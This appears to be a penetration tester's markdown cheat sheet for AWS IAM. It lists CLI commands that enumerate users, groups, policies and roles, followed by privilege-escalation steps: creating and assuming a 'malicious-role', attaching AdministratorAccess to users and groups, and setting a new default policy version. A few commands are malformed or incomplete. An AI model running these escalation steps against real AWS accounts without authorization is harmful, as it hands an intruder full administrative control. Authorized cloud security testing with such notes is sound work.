# AWS-Pentesting-Notes

# IAM

## CLI Enumeration
```
# List Users
aws iam list-users

# List Groups for User
aws iam list-groups-for-user --user-name user1

# Check Policies Attached to User
aws iam list-attached-user-policies --user-name user1
aws iam list-user-policies --user-name user1

# Check for any Signing Certificates for a User
aws iam list-signing-certificates --user-name user1

# Check for any public SSH keys for User
aws iam list-ssh-public-keys --user-name user1

# Get ssh key details
aws iam get-ssh-public-key --user-name user1 --encoding PEM --ssh-public-key-id APKA...

# List MFA devices
aws iam list-virtual-mfa-devices

# Check for user login profile
aws iam get-login-profile --user-name user1

# List Groups
aws iam list-groups

# Check Group Policies
aws iam list-group-policies --group-name group1
aws iam list-attached-group-policies --group-name group1

# List Policies
aws iam list-policies

# List Customer Managed Policies
aws iam list-policies --scope Local | grep -A2 PolicyName

# Get Policy Details
aws iam get-policy --policy-arn arn:aws:iam:...

# Get Policy Version Document
aws iam get-policy-version --policy-arn arn:aws:iam::... --version-id v1

# List IAM Roles
aws iam list-roles

# Check Role Details
aws iam get-role --role-name role1

# Check for policies attached to roles
aws iam list-attached-role-policies --role-name role1
aws iam list-role-policies --role-name role1

```

## IAM Privilege Escalation

Allow remote access to role / Misconfigured Trust Policy
```
aws iam create-role --role-name malicious-role --assume-role-policy-document file://assume-role-doc.json
```

Assume misconfigured role
```
aws sts assume-role --role-arn arn:aws:iam::1234:role/malicious-role --role-session-name session1
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
AWS_SESSION_TOKEN=...
aws sts get-caller-identity
```

Exploit Attach User Policy
```
aws iam attach-user-policy --user-name user1 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-policies --user-name user1
```

Create a new user
```
aws iam create-user -user-name user2
```

Add User to Group 
```
aws iam add-user-to-group --group-name admins --user-name user1
aws iam list-groups-for-user --user-name user1
```

Attach Admin Policy to Group
```
aws iam attach-group-policy --group-name users --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-group-policies --group-name users
```

Create new policy version:
```
aws iam create-policy-version --policy-arn arn:aws:iam::12343:policy/policy1 --policy-document file://admin-policy.json --set-as-default
```

